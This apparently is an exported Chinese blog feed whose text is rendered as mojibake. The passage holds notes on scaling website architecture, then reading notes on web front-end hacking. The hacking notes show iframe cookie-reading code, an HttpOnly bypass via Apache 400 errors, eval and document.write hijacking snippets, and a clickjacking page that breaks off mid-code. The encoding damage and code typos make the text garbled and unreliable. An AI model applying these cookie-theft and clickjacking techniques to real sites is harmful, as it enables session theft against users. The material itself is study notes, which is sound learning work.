<h2 id="åº”ç”¨æœåŠ¡å™¨ä¸æ•°æ®æœåŠ¡çš„åˆ†ç¦»"><a href="#åº”ç”¨æœåŠ¡å™¨ä¸æ•°æ®æœåŠ¡çš„åˆ†ç¦»" class="headerlink" title="åº”ç”¨æœåŠ¡å™¨ä¸æ•°æ®æœåŠ¡çš„åˆ†ç¦»"></a>åº”ç”¨æœåŠ¡å™¨ä¸æ•°æ®æœåŠ¡çš„åˆ†ç¦»</h2><p>éšç€ä¸šåŠ¡çš„å‘å±•ï¼ŒæœåŠ¡å™¨çš„ç“¶é¢ˆä¸»é”®æš´éœ²äº†å‡ºæ¥ï¼Œæœ€æ˜æ˜¾çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æœåŠ¡å™¨çš„å­˜å‚¨ç©ºé—´ä¸è¶³ï¼Œäºæ˜¯ä¹æˆ‘ä»¬å°†åº”ç”¨äºæ•°æ®åˆ†å˜ï¼Œåº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“æœåŠ¡å™¨ã€æ–‡ä»¶æœåŠ¡å™¨ä¸‰è€…åˆ†ç¦»</p>
<p><img src="/archives/4d872363/Untitled-1.png"></p>
<h2 id="ä½¿ç”¨ç¼“å­˜æ”¹å–„ç½‘ç«™æ€§èƒ½"><a href="#ä½¿ç”¨ç¼“å­˜æ”¹å–„ç½‘ç«™æ€§èƒ½" class="headerlink" title="ä½¿ç”¨ç¼“å­˜æ”¹å–„ç½‘ç«™æ€§èƒ½"></a>ä½¿ç”¨ç¼“å­˜æ”¹å–„ç½‘ç«™æ€§èƒ½</h2><p>ä¸šåŠ¡ç»§ç»­å‘å±•ï¼Œæ•°æ®åº“çš„å‹åŠ›è¶Šæ¥è¶Šå¤§ï¼Œé¡¶éƒ¨ä¸šåŠ¡çš„è®¿é—®é‡å æ®äº†æ•´ä¸ªä¸šåŠ¡çš„80%çš„æµé‡ï¼Œäºæ˜¯ä¹ä¾¿æœ‰äº†ç¼“å­˜æœåŠ¡å™¨æŠ€æœ¯ï¼Œå°†è®¿é—®é‡å¤§çš„æ•°æ®æå‰ç¼“å­˜åˆ°ç¼“å­˜æœåŠ¡å™¨ï¼Œæå‡äº†æœåŠ¡çš„é€Ÿç‡ä¸è´¨é‡ã€‚</p>
<p><img src="/archives/4d872363/Untitled-2.png"></p>
<h2 id="ä½¿ç”¨åº”ç”¨æœåŠ¡å™¨é›†ç¾¤æ”¹å–„ç½‘ç«™çš„å¹¶å‘å¤„ç†èƒ½åŠ›"><a href="#ä½¿ç”¨åº”ç”¨æœåŠ¡å™¨é›†ç¾¤æ”¹å–„ç½‘ç«™çš„å¹¶å‘å¤„ç†èƒ½åŠ›" class="headerlink" title="ä½¿ç”¨åº”ç”¨æœåŠ¡å™¨é›†ç¾¤æ”¹å–„ç½‘ç«™çš„å¹¶å‘å¤„ç†èƒ½åŠ›"></a>ä½¿ç”¨åº”ç”¨æœåŠ¡å™¨é›†ç¾¤æ”¹å–„ç½‘ç«™çš„å¹¶å‘å¤„ç†èƒ½åŠ›</h2><p>å•ä¸€åº”ç”¨æœåŠ¡å™¨åœ¨é¢å¯¹é«˜å¹¶å‘çš„åº”ç”¨åœºæ™¯æœ‰æ˜æ˜¾çš„æ€§èƒ½ç“¶é¢ˆï¼Œäºæ˜¯æˆ‘ä»¬é€šè¿‡åº”ç”¨æœåŠ¡å™¨é›†ç¾¤æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé€šè¿‡ä¸€ä¸ªè´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ¥è°ƒåº¦èµ„æºã€‚</p>
<p><img src="/archives/4d872363/Untitled-3.png"></p>
<h2 id="æ•°æ®åº“è¯»å†™åˆ†ç¦»"><a href="#æ•°æ®åº“è¯»å†™åˆ†ç¦»" class="headerlink" title="æ•°æ®åº“è¯»å†™åˆ†ç¦»"></a>æ•°æ®åº“è¯»å†™åˆ†ç¦»</h2><p>ä½¿ç”¨äº†ç¼“å­˜åï¼ŒåŸºæœ¬è§£å†³äº†æ•°æ®åº“è¯»çš„å‹åŠ›ï¼Œä½†éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œæ•°æ®å†™çš„å‹åŠ›è¶Šæ¥æ„ˆå¤§ï¼Œè¿™æ—¶å€™é€šè¿‡è¯»å†™åˆ†ç¦»æ¥è§£å†³ï¼Œé€šè¿‡ä½¿ç”¨ä¸»ä»æ•°æ®åº“æœåŠ¡å™¨æ¥ä¼˜åŒ–æ•°æ®åº“çš„æ€§èƒ½ï¼Œå†™å…¥æ“ä½œéƒ½åˆ°è¾¾ä¸»æœåŠ¡å™¨ï¼Œä»æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨å¤„å¤åˆ¶æ•°æ®ï¼Œè¯»å–æ“ä½œéƒ½åˆ°ä»æœåŠ¡å™¨ã€‚</p>
<p><img src="/archives/4d872363/Untitled-4.png"></p>
<h2 id="ä½¿ç”¨åå‘ä»£ç†å’Œ-CDN-åŠ é€Ÿç½‘ç«™å“åº”"><a href="#ä½¿ç”¨åå‘ä»£ç†å’Œ-CDN-åŠ é€Ÿç½‘ç«™å“åº”" class="headerlink" title="ä½¿ç”¨åå‘ä»£ç†å’Œ CDN åŠ é€Ÿç½‘ç«™å“åº”"></a>ä½¿ç”¨åå‘ä»£ç†å’Œ CDN åŠ é€Ÿç½‘ç«™å“åº”</h2><p>cdn å†…å®¹åˆ†å‘ç½‘ç»œï¼Œé€šè¿‡å°†ç”¨æˆ·å¼•æµè‡³ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡å™¨ï¼Œå‡è½»ä¸­å¿ƒæœåŠ¡å™¨çš„å‹åŠ›ã€‚é€šè¿‡dnsæœåŠ¡å™¨æ¥å®ç°è´Ÿè½½å‡è¡¡ã€‚</p>
<p>åå‘ä»£ç† </p>
<p><img src="/archives/4d872363/Untitled-5.png"></p>
<h2 id="ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå’Œåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿ"><a href="#ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå’Œåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå’Œåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿ"></a>ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå’Œåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿ</h2><p>ä»»ä½•å¼ºå¤§çš„å•ä¸€æœåŠ¡å™¨éƒ½æ»¡è¶³ä¸äº†å¤§å‹ç½‘ç«™æŒç»­å¢é•¿çš„ä¸šåŠ¡éœ€æ±‚ã€‚æ•°æ®åº“ç»è¿‡è¯»å†™åˆ†ç¦»åï¼Œä»ä¸€å°æœåŠ¡å™¨æ‹†åˆ†æˆä¸¤å°æœåŠ¡å™¨ï¼Œä½†æ˜¯éšç€ç½‘ç«™ä¸šåŠ¡çš„å‘å±•ä¾ç„¶ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼æ•°æ®åº“ã€‚æ–‡ä»¶ç³»ç»Ÿä¹Ÿä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p><img src="/archives/4d872363/Untitled-6.png"></p>
<p>æ•°æ®åº“åˆ’åˆ†æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯åˆ†å‰²ä¸åˆ†å±‚</p>
<p>åˆ†å±‚æ˜¯å‚ç›´çš„ï¼Œå°†ä¸åŒçš„ä¸šåŠ¡çš„æ•°æ®ç‹¬ç«‹å­˜å‚¨</p>
<p>åˆ†å‰²æ˜¯æ°´å¹³çš„ï¼Œå½“ä¸€ä¸ªè¡¨çš„æ•°æ®è¶…è¿‡äº†æ•°æ®åº“çš„æ€§èƒ½æé™çš„æ—¶å€™ï¼Œå°†å…¶åˆ†å‰²æˆå‡ ç¯‡å­˜å‚¨åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šé¢</p>
<h2 id="ä½¿ç”¨-NoSQL-å’Œæœç´¢å¼•æ“"><a href="#ä½¿ç”¨-NoSQL-å’Œæœç´¢å¼•æ“" class="headerlink" title="ä½¿ç”¨ NoSQL å’Œæœç´¢å¼•æ“"></a>ä½¿ç”¨ NoSQL å’Œæœç´¢å¼•æ“</h2><p>éšç€ç½‘ç«™ä¸šåŠ¡è¶Šæ¥è¶Šå¤æ‚ï¼Œå¯¹æ•°æ®å­˜å‚¨å’Œæ£€ç´¢çš„éœ€æ±‚ä¹Ÿè¶Šæ¥è¶Šå¤æ‚ï¼Œç½‘ç«™éœ€è¦é‡‡ç”¨ä¸€äº›éå…³ç³»æ•°æ®åº“æŠ€æœ¯å¦‚ NoSQL å’Œéæ•°æ®åº“æŸ¥è¯¢æŠ€æœ¯å¦‚æœç´¢å¼•æ“ã€‚</p>
<p><img src="/archives/4d872363/Untitled-7.png"></p>
<h2 id="ä¸šåŠ¡æ‹†åˆ†"><a href="#ä¸šåŠ¡æ‹†åˆ†" class="headerlink" title="ä¸šåŠ¡æ‹†åˆ†"></a>ä¸šåŠ¡æ‹†åˆ†</h2><p>å¤§å‹ç½‘ç«™ä¸ºäº†åº”å¯¹æ—¥ç›Šå¤æ‚çš„ä¸šåŠ¡åœºæ™¯ï¼Œé€šè¿‡ä½¿ç”¨åˆ†è€Œæ²»ä¹‹çš„æ‰‹æ®µå°†æ•´ä¸ªç½‘ç«™ä¸šåŠ¡åˆ†æˆä¸åŒçš„äº§å“çº¿ã€‚å¦‚å¤§å‹è´­ç‰©äº¤æ˜“ç½‘ç«™éƒ½ä¼šå°†é¦–é¡µã€å•†é“ºã€è®¢å•ã€ä¹°å®¶ã€å–å®¶ç­‰æ‹†åˆ†æˆä¸åŒçš„äº§å“çº¿ï¼Œåˆ†å½’ä¸åŒçš„ä¸šåŠ¡å›¢é˜Ÿè´Ÿè´£ã€‚</p>
<p>å…·ä½“åˆ°æŠ€æœ¯ä¸Šï¼Œä¹Ÿä¼šæ ¹æ®äº§å“çº¿åˆ’åˆ†ï¼Œå°†ä¸€ä¸ªç½‘ç«™æ‹†åˆ†æˆè®¸å¤šä¸åŒçš„åº”ç”¨ï¼Œæ¯ä¸ªåº”ç”¨ç‹¬ç«‹éƒ¨ç½²ã€‚åº”ç”¨ä¹‹é—´å¯ä»¥é€šè¿‡ä¸€ä¸ªè¶…é“¾æ¥å»ºç«‹å…³ç³»ï¼ˆåœ¨é¦–é¡µä¸Šçš„å¯¼èˆªé“¾æ¥æ¯ä¸ªéƒ½æŒ‡å‘ä¸åŒçš„åº”ç”¨åœ°å€ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—è¿›è¡Œæ•°æ®åˆ†å‘ï¼Œå½“ç„¶æœ€å¤šçš„è¿˜æ˜¯é€šè¿‡è®¿é—®åŒä¸€ä¸ªæ•°æ®å­˜å‚¨ç³»ç»Ÿæ¥æ„æˆä¸€ä¸ªå…³è”çš„å®Œæ•´ç³»ç»Ÿ</p>
<p><img src="/archives/4d872363/Untitled-8.png"></p>
<h2 id="åˆ†å¸ƒå¼æœåŠ¡"><a href="#åˆ†å¸ƒå¼æœåŠ¡" class="headerlink" title="åˆ†å¸ƒå¼æœåŠ¡"></a>åˆ†å¸ƒå¼æœåŠ¡</h2><p>éšç€ä¸šåŠ¡æ‹†åˆ†è¶Šæ¥è¶Šå°ï¼Œå­˜å‚¨ç³»ç»Ÿè¶Šæ¥è¶Šåºå¤§ï¼Œåº”ç”¨ç³»ç»Ÿçš„æ•´ä½“å¤æ‚åº¦å‘ˆæŒ‡æ•°çº§å¢åŠ ï¼Œéƒ¨ç½²ç»´æŠ¤è¶Šæ¥è¶Šå›°éš¾ã€‚ç”±äºæ‰€æœ‰åº”ç”¨è¦å’Œæ‰€æœ‰æ•°æ®åº“ç³»ç»Ÿè¿æ¥ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨è§„æ¨¡çš„ç½‘ç«™ä¸­ï¼Œè¿™äº›è¿æ¥çš„æ•°ç›®æ˜¯æœåŠ¡å™¨è§„æ¨¡çš„å¹³æ–¹ï¼Œå¯¼è‡´æ•°æ®åº“è¿æ¥èµ„æºä¸è¶³ï¼Œæ‹’ç»æœåŠ¡ã€‚</p>
<p>æ—¢ç„¶æ¯ä¸€ä¸ªåº”ç”¨ç³»ç»Ÿéƒ½éœ€è¦æ‰§è¡Œè®¸å¤šç›¸åŒçš„ä¸šåŠ¡æ“ä½œï¼Œæ¯”å¦‚ç”¨æˆ·ç®¡ç†ã€å•†å“ç®¡ç†ç­‰ï¼Œé‚£ä¹ˆå¯ä»¥å°†è¿™äº›å…±ç”¨çš„ä¸šåŠ¡æå–å‡ºæ¥ï¼Œç‹¬ç«‹éƒ¨ç½²ã€‚ç”±è¿™äº›å¯å¤ç”¨çš„ä¸šåŠ¡è¿æ¥æ•°æ®åº“ï¼Œæä¾›å…±ç”¨ä¸šåŠ¡æœåŠ¡ï¼Œè€Œåº”ç”¨ç³»ç»Ÿåªéœ€è¦ç®¡ç†ç”¨æˆ·ç•Œé¢ï¼Œé€šè¿‡åˆ†å¸ƒå¼æœåŠ¡è°ƒç”¨å…±ç”¨ä¸šåŠ¡æœåŠ¡å®Œæˆå…·ä½“ä¸šåŠ¡æ“ä½œã€‚</p>
<p><img src="/archives/4d872363/Untitled-9.png"></p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>ç½‘ç«™</category>
      </categories>
      <tags>
        <tag>ç½‘ç«™</tag>
      </tags>
  </entry>
  <entry>
    <title>è¯»ä¹¦ç¬”è®°-WEBå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜</title>
    <url>/archives/6eecc4bb.html</url>
    <content><![CDATA[<h1 id="è¯»ä¹¦ç¬”è®°-WEBå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜"><a href="#è¯»ä¹¦ç¬”è®°-WEBå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜" class="headerlink" title="è¯»ä¹¦ç¬”è®°-WEBå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜"></a>è¯»ä¹¦ç¬”è®°-WEBå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜</h1><p>èµ„æºï¼šåŒæºç­–ç•¥é‡Œé¢çš„èµ„æºæŒ‡çš„æ˜¯webå®¢æˆ·ç«¯çš„èµ„æºï¼ŒåŒ…æ‹¬httpæ¶ˆæ¯å¤´ï¼Œdomæ ‘ï¼Œæµè§ˆå™¨å­˜å‚¨ï¼ˆcookie\localStorageï¼‰</p>
<p>DOMï¼šæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œå°±æ˜¯å°†html&#x2F;xmlè¿™æ ·çš„æ–‡æ¡£æŠ½è±¡æˆä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œæ ‘ä¸Šçš„æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ˜¯html&#x2F;xmlçš„æ ‡ç­¾ã€æ ‡ç­¾å†…å®¹ã€æ ‡ç­¾å±æ€§</p>
<blockquote>
<p>å®‰å…¨é—®é¢˜å¾ˆå¤§ç¨‹åº¦ä¸Šå…¶å®æ˜¯ä¿¡ä»»å…³ç³»<br>iframeä¸­åµŒå¥—çš„ç½‘é¡µä¸èƒ½è¯»å†™çˆ¶é¡µä¸­çš„æ•°æ®ï¼Œä½†æ˜¯å¯ä»¥å¯¹çˆ¶é¡µçš„<code>location</code> è¿›è¡Œæ“ä½œï¼Œä¸è¿‡åªæœ‰å†™æƒé™å´æ²¡æœ‰è¯»æƒé™</p>
</blockquote>
<p>javascript è„šæœ¬å¯ä»¥å¤–æ¥å¼•å…¥ï¼Œä¹Ÿå¯ä»¥åœ¨<code>&lt;script&gt;</code> æ ‡ç­¾ä¸­ï¼Œä¹Ÿå¯ä»¥åœ¨srcã€hrefçš„ä¼ªåè®®ä¸­ã€‚</p>
<p>é€šè¿‡è®¾ç½®set-cookieçš„pathä¸èƒ½é™åˆ¶cookieè¢«ç›—ç”¨ï¼Œå¯ä»¥åœ¨é¡µé¢ä¸­åµŒå…¥ä¸€ä¸ªiframeæ¥è·å–å½“å‰é¡µé¢çš„cookie.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">xc = <span class="keyword">function</span>(<span class="params">src</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> o=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">	o.<span class="property">src</span>=src;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementByTagName</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(o);</span><br><span class="line">	o.<span class="property">onload</span>=<span class="keyword">function</span>&#123;</span><br><span class="line">	d=o.<span class="property">contentDocument</span> || o.<span class="property">contentWindow</span>.<span class="title function_">document</span>();</span><br><span class="line">	<span class="title function_">alert</span>(d.<span class="property">cookie</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;(<span class="string">&quot;http://a.foo.com/admin/index.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>cookieè®¾ç½®äº†httponlyä¹‹åï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬å°±ä¸èƒ½å¯¹å…¶è¿›è¡Œè¯»å†™ï¼Œä½†æ˜¯ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå¦‚æœæœåŠ¡å™¨çš„å“åº”æ´é¢å«æœ‰cookieè°ƒè¯•ä¿¡æ¯ï¼Œåˆ™å¯èƒ½å¯¼è‡´cookieæ³„éœ²ï¼Œå¦‚phpinfo()ï¼ŒDjangoè°ƒå¼ä¿¡æ¯</p>
<p>Apache HTTP Server 400 é”™è¯¯ä¼šè¿”å›http only cookie ã€‚apache http sever 2.2.xå¤šä¸ªç‰ˆæœ¬æ²¡æœ‰ä¸¥æ ¼é™åˆ¶httpè¯·æ±‚å¤´çš„å†…å®¹ï¼Œå½“è¯·æ±‚å¤´çš„é•¿åº¦è¶…è¿‡<code>limitRequestFieldSize</code>é•¿åº¦æ—¶ï¼ŒæœåŠ¡å™¨å°†ä¼šè¿”å›400-bad requesté”™è¯¯ï¼Œå¹¶åœ¨è¿”å›çš„ä¿¡æ¯ä¸­å°†å‡ºé”™çš„è¯·æ±‚å¤´çš„å†…å®¹è¾“å‡ºã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ„é€ è¶…é•¿çš„è¯·æ±‚å¤´ï¼Œä¸»åŠ¨è§¦å‘400é”™è¯¯è·å–cookie.</p>
<p>è®¾ç½®äº†secureçš„cookieåªèƒ½é€šè¿‡httpsåè®®ä¼ è¾“ï¼Œä½†å´æ˜¯å¯è¯»å†™çš„ã€‚è¿™å°±æ„å‘³ç€ï¼Œè¯¥ç±»å‹çš„cookieå¯è¢«ç¯¡æ”¹ã€‚</p>
<p>ä¿®æ”¹cookieçš„æ—¶å€™å­—æ®µåã€pathã€dmainå¿…é¡»ä¸ç›®æ ‡cookie,ï¼Œä¸ç„¶ä¼šè¢«è®¤ä¸ºæ˜¯æ–°çš„cookieï¼Œèµ·ä¸åˆ°æ”¹å†™çš„ä½œç”¨</p>
<p>cookieåˆ†ä¸ºæœ¬åœ°cookieä¸å†…å­˜cookie</p>
<ol>
<li>æœ¬åœ°cookieè®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„cookieè¢«æµè§ˆå™¨å­˜å‚¨åœ¨æœ¬åœ°ï¼Œå¯è¢«è·å–ä¸ç¯¡æ”¹ã€‚</li>
<li>å†…å­˜cookieæœªè®¾ç½®è¿‡æœŸæ—¶é—´çš„cookie,è¢«æµè§ˆå™¨å­˜å‚¨å’‹å†…å­˜ä¸­ï¼Œå¯ä»¥è¢«åŠ ä¸Šè¿‡æœŸæ—¶é—´ï¼Œä»è€Œå­˜å‚¨åœ¨æœ¬åœ°è¢«è¯»å–ç¯¡æ”¹</li>
</ol>
<p>cookieçš„p3pæ€§è´¨</p>
<p>è¯¥æ ‡å‡†è§„å®šäº†æ˜¯å¦å…è®¸ç›®æ ‡ç½‘ç«™çš„cookieæ˜¯å¦å¯ä»¥è¢«å¦ä¸€ä¸ªåŸŸé€šè¿‡åŠ è½½ç›®æ ‡ç½‘ç«™è€Œè¢«è®¾ç½®ä¸å‘é€ï¼Œä»…ieæµè§ˆå™¨æ‰§è¡Œäº†è¯¥ç­–ç•¥ã€‚</p>
<p><strong>è®¾ç½®cookie</strong></p>
<p>é»˜è®¤æƒ…å†µå†™ieæ—¶ä¸ä¼šå…è®¸ç¬¬ä¸‰æ–¹çš„åŸŸè®¾ç½®cookieçš„ï¼Œä½†å¦‚æœå®¹å™¨åŸŸåœ¨å“åº”çš„æ—¶å€™å¸¦ä¸Šäº†p3på­—æ®µï¼Œæ­¤æ—¶ç¬¬ä¸‰æ–¹åŸŸå°±å¯ä»¥æˆåŠŸè®¾ç½®cookieã€‚è®¾ç½®åçš„cookieåœ¨idä¸‹ä¼šè‡ªåŠ¨å¸¦ä¸Šp3på±æ€§ï¼Œä¾æ¬¡ç”Ÿæ•ˆï¼Œå³ä½¿ä¹‹åæ²¡æœ‰p3på¤´ï¼Œä¹Ÿæœ‰æ•ˆã€‚</p>
<p><strong>å‘é€cookie</strong></p>
<p>å‘é€çš„cookieå¦‚æœæ˜¯å†…å­˜cookieï¼Œé‚£ä¹ˆæ— è®ºæ˜¯å¦å¸¦æœ‰p3på±æ€§ï¼Œéƒ½å¯ä»¥æ­£å¸¸å‘é€ï¼Œå¦‚æœæ˜¯æœ¬åœ°cookieåˆ™è¿™ä¸ªæœ¬åœ°cookieå¿…é¡»è¦æœ‰p3på±æ€§ï¼Œå¦åˆ™å³ä½¿3ç›®æ ‡åŸŸå“åº”äº†p3på¤´ä¹Ÿæ²¡ç”¨ã€‚</p>
<p>å¤§å¤šæ•°æµè§ˆå™¨é™åˆ¶æ¯ä¸ªçª—å£æœ€å¤šèƒ½æœ‰50ä¸ªcookie,æœ€å¤§å€¼çº¦4k</p>
<p>jså‡½æ•°åŠ«æŒ</p>
<p>åœ¨ç›®æ ‡å‡½æ•°æ‰§è¡Œå‰ï¼Œé‡å†™è¿™ä¸ªå‡½æ•°å³å¯ã€‚</p>
<p>ä¸‹é¢æ˜¯evalå‡½æ•°çš„åŠ«æŒè¯­å¥</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">var_eval=<span class="built_in">eval</span>;</span><br><span class="line"><span class="built_in">eval</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">typeof</span>(x)==<span class="string">&quot;undifined&quot;</span>)&#123;</span><br><span class="line">		<span class="title function_">alert</span>(x);</span><br><span class="line">		<span class="title function_">_eval</span>(x);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°è„šæœ¬çš„æ‰§è¡Œç»“æœå°±æ˜¯ï¼Œä¼šå…ˆå¼¹çª—å†æ­£å¸¸æ‰§è¡Œ</p>
<p>åŒæ ·çš„document.write ä¸document.writelnå¯ä»¥é€šè¿‡åŒæ ·çš„æ–¹å¼åŠ«æŒ</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">var_write=<span class="variable language_">document</span>.<span class="property">write</span>.<span class="title function_">bind</span>(<span class="variable language_">document</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">write</span>=<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">typeof</span>(x)==<span class="string">&quot;undifined&quot;</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="title function_">_write</span>(x)</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>æ“ä½œç•Œé¢åŠ«æŒ</code>ï¼Œé€šè¿‡å†å¯è§çš„æ“ä½œç•Œé¢å…ƒç´ ä¸Šä¼ªè£…ä¸€å±‚ä¸å¯è§çš„iframeä»¥è¾¾åˆ°åŠ«æŒçš„ç›®çš„ã€‚</p>
<p>å¯åˆ†ä¸ºä¸‰ç§ï¼š</p>
<ol>
<li><p><strong>ç‚¹å‡»åŠ«æŒ:</strong></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">**file:1**</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#click</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#hidden</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">filter</span>: <span class="built_in">alpha</span>(opacity=<span class="number">50</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;click&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;inneriframe.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">**file2:**</span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span 